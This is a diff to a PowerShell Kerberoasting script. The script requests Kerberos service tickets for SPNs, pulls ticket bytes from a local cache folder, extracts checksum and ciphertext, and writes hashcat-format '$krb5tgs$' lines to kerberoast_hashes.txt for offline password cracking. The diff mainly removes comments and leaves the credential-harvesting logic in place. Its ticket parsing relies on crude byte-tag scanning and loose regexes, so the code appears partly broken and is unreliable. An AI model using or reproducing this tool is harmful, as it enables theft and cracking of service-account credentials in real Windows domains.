@@ -27,7 +27,7 @@ function Request-TgsForSPN {
     # Uses KerberosRequestorSecurityToken to get ticket in ticket cache
     try {
         $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken($SPN)
-        $identity = $token.GetRequest() # Forces ticket request, but we don't extract ticket here.
+        $identity = $token.GetRequest() # Forces ticket request.
         Write-Host "    Requested TGS for $SPN"
     }
     catch {
@@ -36,7 +36,6 @@ function Request-TgsForSPN {
 }
 
 function Read-KerberosTickets {
-    # Returns raw bytes of all tickets in Windows Kerberos cache folder
     $cacheFolder = Join-Path $env:USERPROFILE "AppData\Local\Microsoft\Windows\Kerberos\Cache"
     if (-not (Test-Path $cacheFolder)) {
         Write-Warning "Kerberos cache folder not found: $cacheFolder"
@@ -63,18 +62,14 @@ function Parse-DerTicket {
     param (
         [byte[]]$Data
     )
-    # Basic DER parser for the outer ticket structure, simplified
-    # This function returns a custom object containing etype, username, realm, SPN, checksum, ciphertext, and salt.
-    # We rely on tag scanning and offsets since full ASN.1 parsing is complex
+  
 
-    # Simple helper to get string from bytes
+   
     function BytesToAscii([byte[]]$b) {
         return [System.Text.Encoding]::ASCII.GetString($b).Trim([char]0)
     }
 
-    # Find ETYPE (encryption type) - INTEGER tagged 0x02
-    # Find enc-part (encrypted part) - OCTET STRING tagged 0x04
-    # Also find realm, username, SPN strings (GENERAL STRATEGY: find common patterns)
+
 
     $etype = 0
     $realm = ""
@@ -108,7 +103,7 @@ function Parse-DerTicket {
         return $null
     }
 
-    # Search for encrypted part (tag 0x04 OCTET STRING)
+
     $encIndex = -1
     for ($i=0; $i -lt $Data.Length - 2; $i++) {
         if ($Data[$i] -eq 0x04) {
@@ -125,11 +120,11 @@ function Parse-DerTicket {
         return $null
     }
 
-    # Parse encrypted data
+  
     $encLen = $Data[$encIndex - 1]
     $encData = $Data[$encIndex..($encIndex + $encLen - 1)]
 
-    # Extract checksum and ciphertext from encData depending on enctype
+    
     if ($etype -eq 23) {
         # RC4 - checksum 16 bytes + ciphertext
         if ($encData.Length -lt 16) { return $null }
@@ -139,7 +134,7 @@ function Parse-DerTicket {
         $ciphertext = ($cipherBytes | ForEach-Object { $_.ToString("x2") }) -join ""
     }
     elseif ($etype -eq 17 -or $etype -eq 18) {
-        # AES - checksum 12 bytes + ciphertext
+        
         if ($encData.Length -lt 12) { return $null }
         $checksumBytes = $encData[0..11]
         $cipherBytes = $encData[12..($encData.Length - 1)]
@@ -152,8 +147,7 @@ function Parse-DerTicket {
         return $null
     }
 
-    # Extract realm (search for ASCII strings that look like realm)
-    # Simple regex for realm: uppercase letters, dots, dashes
+  
     $asciiStr = [System.Text.Encoding]::ASCII.GetString($Data)
     $realmMatch = [regex]::Matches($asciiStr, "\b[A-Z0-9.-]{2,}\b") | Where-Object { $_.Value -match "^[A-Z0-9.-]+$" }
     if ($realmMatch.Count -gt 0) {
@@ -161,13 +155,13 @@ function Parse-DerTicket {
         $salt = $realm.ToUpper()
     }
 
-    # Extract username - look for sequences near realm
+    
     $userMatch = [regex]::Matches($asciiStr, "\b[a-zA-Z0-9._-]{2,20}\b") | Where-Object { $_.Value -ne $realm }
     if ($userMatch.Count -gt 0) {
         $username = $userMatch[0].Value
     }
 
-    # Extract SPN - look for service principal pattern "service/host" 
+    
     $spnMatch = [regex]::Matches($asciiStr, "\b[a-zA-Z0-9._-]+\/[a-zA-Z0-9._-]+\b")
     if ($spnMatch.Count -gt 0) {
         $spn = $spnMatch[0].Value
@@ -175,7 +169,7 @@ function Parse-DerTicket {
         $spn = "krbtgt/$realm"
     }
 
-    # Compose hashcat line
+   
     if ($etype -eq 23) {
         $line = "`$krb5tgs`$23`$*$username*$realm*$spn*$checksum`$$ciphertext"
     }
@@ -188,7 +182,7 @@ function Parse-DerTicket {
     return $line
 }
 
-# Main execution block
+
 
 $OutputFile = "$PWD\kerberoast_hashes.txt"
 $hashes = @()
